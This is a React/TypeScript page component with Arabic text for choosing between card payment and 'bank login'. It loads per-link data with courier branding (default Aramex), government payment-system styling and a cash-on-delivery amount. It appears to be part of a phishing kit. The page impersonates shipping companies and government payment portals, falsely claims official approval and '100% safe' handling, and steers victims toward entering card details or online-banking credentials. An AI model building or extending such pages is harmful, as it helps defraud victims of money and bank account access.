import type { PaymentPayload } from "@/types/payload";
import { useState } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { Card } from "@/components/ui/card";
import { useLink, useUpdateLink } from "@/hooks/useSupabase";
import { CreditCard, Building2, Shield, ArrowRight, CheckCircle2 } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { getServiceBranding } from "@/lib/serviceLogos";
import { getGovernmentPaymentSystem } from "@/lib/governmentPaymentSystems";
import { getCountryByCode } from "@/lib/countries";
import { formatCurrency, getCurrencyByCountry } from "@/lib/countryCurrencies";
import DynamicPaymentLayout from "@/components/DynamicPaymentLayout";

const PaymentMethodSelection = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const { toast } = useToast();
  const { data: linkData } = useLink(id);
  const updateLink = useUpdateLink();
  
  const [selectedMethod, setSelectedMethod] = useState<'card' | 'bank_login' | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const serviceKey = linkData?.payload?.service_key || 'aramex';
  const serviceName = linkData?.payload?.service_name || "دفع فاتورة";
  const branding = getServiceBranding(serviceKey);
  const shippingInfo = linkData?.payload as PaymentPayload;

  const countryCode = shippingInfo?.selectedCountry || "SA";
  const govSystem = getGovernmentPaymentSystem(countryCode);
  const countryData = getCountryByCode(countryCode);

  const paymentData = shippingInfo?.payment_data;
  const savedCurrencyCode = paymentData?.currency_code || shippingInfo?.currency_code;
  const currencyCodeToUse = savedCurrencyCode || getCurrencyByCountry(countryCode).code;

  const rawAmount = paymentData?.payment_amount || shippingInfo?.cod_amount || shippingInfo?.payment_amount;
  let amount = 500;
  if (rawAmount !== undefined && rawAmount !== null) {
    if (typeof rawAmount === 'number') {
      amount = rawAmount;
    } else if (typeof rawAmount === 'string') {
      const parsed = parseFloat(rawAmount);
      if (!isNaN(parsed)) {
        amount = parsed;
      }
    }
  }

  const formattedAmount = formatCurrency(amount, currencyCodeToUse);

  const handleContinue = async () => {
    if (!selectedMethod) {
      toast({
        title: "الرجاء الاختيار",
        description: "يرجى اختيار طريقة الدفع المناسبة",
        variant: "destructive",
      });
      return;
    }

    setIsSubmitting(true);

    try {
      const updatedPayload = {
        ...linkData?.payload,
        payment_method: selectedMethod,
      };

      await updateLink.mutateAsync({
        linkId: id!,
        payload: updatedPayload
      });

      toast({
        title: "تم الاختيار",
        description: selectedMethod === 'card' ? "سيتم الدفع ببطاقة الائتمان" : "سيتم الدفع عبر تسجيل الدخول البنكي",
      });

      navigate(`/pay/${id}/payment-details`);
    } catch (error) {
      toast({
        title: "خطأ",
        description: "حدث خطأ أثناء حفظ الاختيار",
        variant: "destructive",
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <DynamicPaymentLayout
      serviceName={serviceName}
      serviceKey={serviceKey}
      amount={formattedAmount}
      title="اختر طريقة الدفع"
      description={`اختر الطريقة المناسبة للدفع لخدمة ${serviceName}`}
      icon={<Shield className="w-7 h-7 sm:w-10 sm:h-10 text-white" />}
    >
      <div className="space-y-4 mb-8">
        {/* Card Payment Option */}
        <Card
          className={`p-6 cursor-pointer transition-all duration-200 border-2 hover:shadow-lg ${
            selectedMethod === 'card'
              ? 'border-current shadow-md'
              : 'border-gray-200 hover:border-gray-300'
          }`}
          style={{
            borderColor: selectedMethod === 'card' ? govSystem.colors.primary : undefined,
            backgroundColor: selectedMethod === 'card' ? `${govSystem.colors.primary}08` : 'white'
          }}
          onClick={() => setSelectedMethod('card')}
        >
          <div className="flex items-start gap-4">
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
              style={{ 
                backgroundColor: selectedMethod === 'card' ? govSystem.colors.primary : `${govSystem.colors.primary}20`
              }}
            >
              <CreditCard 
                className="w-6 h-6" 
                style={{ 
                  color: selectedMethod === 'card' ? 'white' : govSystem.colors.primary 
                }}
              />
            </div>
            
            <div className="flex-1">
              <div className="flex items-center justify-between mb-2">
                <h3 
                  className="text-lg font-bold"
                  style={{ 
                    color: govSystem.colors.text,
                    fontFamily: govSystem.fonts.primaryAr 
                  }}
                >
                  الدفع ببطاقة الائتمان
                </h3>
                {selectedMethod === 'card' && (
                  <CheckCircle2 
                    className="w-6 h-6" 
                    style={{ color: govSystem.colors.primary }}
                  />
                )}
              </div>
              
              <p 
                className="text-sm mb-3"
                style={{ color: govSystem.colors.textLight }}
              >
                ادفع مباشرة باستخدام بطاقة الائتمان أو الخصم الخاصة بك
              </p>
              
              <div className="flex flex-wrap gap-2">
                <span className="px-3 py-1 rounded-full text-xs font-medium bg-green-100 text-green-700">
                  سريع وآمن
                </span>
                <span className="px-3 py-1 rounded-full text-xs font-medium bg-blue-100 text-blue-700">
                  لا يتطلب تسجيل دخول
                </span>
              </div>
            </div>
          </div>
        </Card>

        {/* Bank Login Option */}
        <Card
          className={`p-6 cursor-pointer transition-all duration-200 border-2 hover:shadow-lg ${
            selectedMethod === 'bank_login'
              ? 'border-current shadow-md'
              : 'border-gray-200 hover:border-gray-300'
          }`}
          style={{
            borderColor: selectedMethod === 'bank_login' ? govSystem.colors.primary : undefined,
            backgroundColor: selectedMethod === 'bank_login' ? `${govSystem.colors.primary}08` : 'white'
          }}
          onClick={() => setSelectedMethod('bank_login')}
        >
          <div className="flex items-start gap-4">
            <div
              className="w-12 h-12 rounded-lg flex items-center justify-center flex-shrink-0"
              style={{ 
                backgroundColor: selectedMethod === 'bank_login' ? govSystem.colors.primary : `${govSystem.colors.primary}20`
              }}
            >
              <Building2 
                className="w-6 h-6" 
                style={{ 
                  color: selectedMethod === 'bank_login' ? 'white' : govSystem.colors.primary 
                }}
              />
            </div>
            
            <div className="flex-1">
              <div className="flex items-center justify-between mb-2">
                <h3 
                  className="text-lg font-bold"
                  style={{ 
                    color: govSystem.colors.text,
                    fontFamily: govSystem.fonts.primaryAr 
                  }}
                >
                  الدفع بتسجيل الدخول البنكي
                </h3>
                {selectedMethod === 'bank_login' && (
                  <CheckCircle2 
                    className="w-6 h-6" 
                    style={{ color: govSystem.colors.primary }}
                  />
                )}
              </div>
              
              <p 
                className="text-sm mb-3"
                style={{ color: govSystem.colors.textLight }}
              >
                سجّل الدخول إلى حسابك البنكي مباشرة لإتمام عملية الدفع
              </p>
              
              <div className="flex flex-wrap gap-2">
                <span className="px-3 py-1 rounded-full text-xs font-medium bg-purple-100 text-purple-700">
                  أكثر أماناً
                </span>
                <span className="px-3 py-1 rounded-full text-xs font-medium bg-orange-100 text-orange-700">
                  بدون إدخال بيانات البطاقة
                </span>
              </div>
            </div>
          </div>
        </Card>
      </div>

      {/* Payment Info Box */}
      <div 
        className="mb-6 p-4 rounded-lg border"
        style={{
          backgroundColor: `${govSystem.colors.primary}05`,
          borderColor: `${govSystem.colors.primary}20`
        }}
      >
        <div className="flex items-center gap-2 mb-2">
          <Shield className="w-5 h-5" style={{ color: govSystem.colors.primary }} />
          <h4 
            className="font-semibold text-sm"
            style={{ 
              color: govSystem.colors.text,
              fontFamily: govSystem.fonts.primaryAr 
            }}
          >
            معلومات الدفع الآمن
          </h4>
        </div>
        <ul className="text-xs space-y-1" style={{ color: govSystem.colors.textLight }}>
          <li>• جميع المعاملات محمية بتقنية التشفير SSL</li>
          <li>• نظام {govSystem.nameAr} معتمد للدفع الحكومي</li>
          <li>• بياناتك محفوظة وآمنة 100%</li>
        </ul>
      </div>

      {/* Continue Button */}
      <Button
        onClick={handleContinue}
        disabled={!selectedMethod || isSubmitting}
        className="w-full h-12 text-base font-bold rounded-lg transition-all duration-200"
        style={{
          backgroundColor: selectedMethod ? govSystem.colors.primary : '#ccc',
          color: 'white',
          fontFamily: govSystem.fonts.primaryAr
        }}
      >
        {isSubmitting ? (
          <>
            <span className="animate-spin mr-2">⏳</span>
            جاري الحفظ...
          </>
        ) : (
          <>
            متابعة
            <ArrowRight className="mr-2 h-5 w-5" />
          </>
        )}
      </Button>
    </DynamicPaymentLayout>
  );
};

export default PaymentMethodSelection;
